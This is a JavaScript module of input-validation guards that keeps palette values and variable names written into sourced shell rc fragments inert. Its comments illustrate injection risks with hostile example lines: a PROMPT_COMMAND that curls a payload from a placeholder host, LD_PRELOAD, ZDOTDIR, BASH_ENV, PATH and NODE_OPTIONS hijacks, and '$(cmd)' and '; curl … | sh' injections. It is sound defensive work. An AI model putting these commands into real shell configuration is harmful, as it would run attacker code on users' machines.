// Shell-fragment guards — shared by every themes/**/*.sh emitter in
// build.mjs AND by scripts/check-shell-fragments.mjs, which re-reads the
// committed files from disk.
//
// It lives in its own module for one reason: build.mjs is a side-effecting
// script that WRITES every theme on import, so a gate that imported the
// grammar from there would regenerate the tree it is supposed to be
// independently checking. Two hand-copied variants would drift, which is the
// exact defect this extraction exists to prevent — so: one module, two
// importers.
//
// ── Why a guard at all ────────────────────────────────────────────────
//
// A handful of targets emit a fragment that a shell rc SOURCES, which makes
// them the only place a palette value lands somewhere EXECUTABLE. Shell double
// quotes do NOT suppress $(...) or backticks, so a palette value of
// `#dbb$(cmd)` runs cmd on every source — no quote breakout required.
//
// _palette.json is not repo-authored. It is Lane 1's artifact, pulled over
// DesignSync from an external claude.ai project (CLAUDE.md § Encapsulation),
// so "they're just our own colours" is not an argument for skipping this.
//
// check:themes structurally CANNOT catch a poisoned palette: it regenerates
// and diffs, so the poisoned palette AND its faithfully regenerated fragment
// both pass green. The guard has to live at the emitter — and because an
// emitter that simply never CALLS it also passes, check-shell-fragments.mjs
// re-reads the committed files and enforces the same grammars from the
// outside.
//
// ── Blast radius ──────────────────────────────────────────────────────
//
// It differs per landing file; the guard does not. gum's fragment rests on
// ~/.zshenv, so it runs in EVERY non-interactive zsh — what scp, sftp,
// git-over-ssh and mosh get, where any byte on stdout during startup corrupts
// the protocol handshake and breaks remote access, not just colour. fzf and
// eza target ~/.zshrc (interactive only). Promotion of anything to ~/.zshenv
// is gated on this grammar holding.

// A palette value bound for a shell fragment must be a six-digit hex, full
// stop. Also catches a typo'd token, which would otherwise emit "undefined".
export const shellHexValue = (token, tokenName, palette, emitter) => {
  if (!token) return '';
  // hasOwn, not a bare index — `in`/`[]` walk the prototype chain, so a token
  // named `constructor` or `toString` resolves to a function. Unreachable
  // today (every caller passes a repo-authored literal) and fail-closed if it
  // were, since a stringified function cannot be a hex — but syntaxToken()
  // already derives token NAMES from the palette for other targets, so a
  // future emitter doing that here would put untrusted keys on this lookup.
  const value = Object.hasOwn(palette, token) ? palette[token] : undefined;
  if (!/^#[0-9a-fA-F]{6}$/.test(value ?? '')) {
    throw new Error(
      `${emitter}: ${tokenName} → "${token}" resolved to ${JSON.stringify(value)}, `
      + 'which is not a six-digit hex colour. Refusing to emit it into a sourced '
      + 'shell fragment.'
    );
  }
  return value;
};

// The variable NAMES an Artificer fragment is allowed to export.
//
// A syntax-only grammar is not enough, and this is the finding that proves it:
// `[A-Z_][A-Z0-9_]*` accepts every dangerous name in the shell, and none of
// them need a single forbidden character to do their damage —
//
//   export PROMPT_COMMAND="curl http://x.tld/p -o /tmp/p"   runs before every bash prompt
//   export LD_PRELOAD="/tmp/e.so"                           code in every child process
//   export ZDOTDIR="/tmp/evil"                              zsh then sources /tmp/evil/.zshrc
//   export BASH_ENV="/tmp/x" / export ENV="/tmp/x"           sourced by non-interactive shells
//   export PATH="/tmp/evil"                                  every later command resolves there
//   export NODE_OPTIONS="--require /tmp/x.js"                every node process
//
// Every one of those passes a hex-clean, quote-clean, both-ends-anchored line
// check. So the name is allowlisted too: an emitter may only export into its
// own namespace, which none of the above is in.
//
// Prefer an EXACT name; reach for a prefix only when an emitter genuinely has
// a family of them. A prefix opens the whole vendor namespace, and vendor
// namespaces contain path-valued variables — EZA_* includes EZA_CONFIG_DIR,
// the directory eza reads a theme from, so `EZA_` would have blessed a name
// that points somewhere rather than describing a colour. gum takes a prefix
// because it really does have 110 GUM_* variables; fzf and eza have one each.
export const SHELL_VAR_PREFIXES = ['GUM_'];
export const SHELL_VAR_NAMES = ['ARTIFICER_FZF_COLORS', 'EZA_COLORS'];

const esc = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const NAME_ALTERNATION = [
  ...SHELL_VAR_PREFIXES.map((p) => `${esc(p)}[A-Z0-9_]*`),
  ...SHELL_VAR_NAMES.map(esc),
].join('|');

// ── Per-emitter value grammars ────────────────────────────────────────
//
// These live here, beside the line grammar, for the same reason the line
// grammar does: they are security controls, and a control that exists in two
// hand-copied places drifts. The emitter asserts with them and the test
// imports them — one definition, two consumers.

// fzf is a SECOND INTERPRETER behind the shell. It re-parses FZF_DEFAULT_OPTS
// and honours --preview, --bind …execute(…), --listen and --history out of it,
// so a line the shell grammar blesses can still execute at fzf runtime. The
// pair shape is spelled out rather than approximated by a character class:
// an assertion that accepts any run of legal characters stops describing its
// own output the moment the slot table changes.
//
// No space anywhere — a space is what would admit a second flag.
export const FZF_COLOR_GRAMMAR =
  /^--color=[A-Za-z0-9+-]+:#[0-9a-fA-F]{6}(,[A-Za-z0-9+-]+:#[0-9a-fA-F]{6})*$/;

// EZA_COLORS is LS_COLORS grammar, so by the time it is assembled it is no
// longer the thing shellHexValue validated — hence its own closed grammar.
// The key half stays permissive because LS_COLORS keys legitimately include
// globs (`*.rs=`); it is safe only because EZA_SLOTS' keys are hard-coded
// literals, never palette-derived.
export const LS_COLORS_GRAMMAR =
  /^[A-Za-z0-9_*.-]+=[0-9;]+(:[A-Za-z0-9_*.-]+=[0-9;]+)*$/;

// Whole-line grammars, deliberately anchored at BOTH ends.
//
// The original guard tested /^(#|export |$)/ — prefix-anchored only, so
// `export A="x"; curl … | sh` passed it. That was survivable while gum was the
// only emitter, because shellHexValue gated the single interpolated value per
// line and there was nothing else on it. Emitters that assemble COMPOSITE
// values (fzf's --color= string, eza's LS_COLORS-grammar list) put real weight
// on the line shape, so both ends are anchored here.
//
// The value forbids `"`, `'`, backtick, `$`, `\` — no command substitution and
// no quote breakout — plus `\r`, which is not executable but makes a committed
// line's rendered content diverge from its bytes during review.
//
// `;` is deliberately ALLOWED, and the reasoning is worth keeping because the
// instinct runs the other way. A `;` is a statement separator only OUTSIDE
// quotes; the danger was always `export A="x"; id`, where it follows the
// closing quote. Both-ends anchoring already kills that — reaching a `;` at
// statement level requires closing the quote first, and `"` is forbidden
// inside the value. Meanwhile eza's EZA_COLORS is LS_COLORS grammar, where `;`
// is the SGR parameter separator (`di=38;2;219;187;111`), so banning it would
// reject correct output. A guard that blocks legitimate work to prevent
// something the anchoring already prevents is friction with no safety.
export const SHELL_LINE_GRAMMARS = [
  /^#[^\n\r]*$/,                                                          // comment
  /^$/,                                                                   // blank
  new RegExp(`^export (?:${NAME_ALTERNATION})="[^"'\`$\\\\\\n\\r]*"$`),
];

export const assertInertFragment = (body, emitter) => {
  const offender = body.split('\n').find((l) => !SHELL_LINE_GRAMMARS.some((re) => re.test(l)));
  if (offender !== undefined) {
    throw new Error(
      `${emitter}: refusing to emit a line that is neither a comment, a blank, `
      + `nor a single inert export: ${JSON.stringify(offender)}. This fragment is `
      + `sourced by a shell rc; anything that executes or prints runs on every `
      + `shell start.`
    );
  }
  return body;
};
